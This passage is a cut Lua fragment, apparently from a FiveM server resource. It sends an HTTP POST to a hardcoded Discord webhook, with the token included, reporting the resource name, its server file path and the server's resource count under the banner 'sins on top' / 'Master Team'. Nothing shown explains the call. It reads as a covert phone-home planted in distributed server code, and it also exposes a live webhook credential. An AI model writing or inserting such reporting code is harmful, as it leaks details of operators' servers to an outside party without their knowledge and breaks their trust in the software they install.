...
PerformHttpRequest('https://discord.com/api/webhooks/857150555659304961/L93Te8cqTBquUk-yhM4POFWRa32xJrnA7_LvPCDaGKvo_YOXBkK_CMBbFD9umte8SA6y', function(err, text, headers) end, 'POST', json.encode({
    username = GetCurrentResourceName() or 'Resource Not Found', 
    embeds = {{
        ["color"] = tonumber(3315810), 
        ["title"]=	'sins on top',
        ["description"] = 'Master Team',
        ["footer"] = {
            ["text"] = GetResourcePath(GetCurrentResourceName() or 'Resource Not Found').." \n\nBoss action \n\nTavasot yek Nafar Run Shod\n\nSins\n\n "..GetNumResources()..' Server resources' ,
        },
    }}, 
}), { 
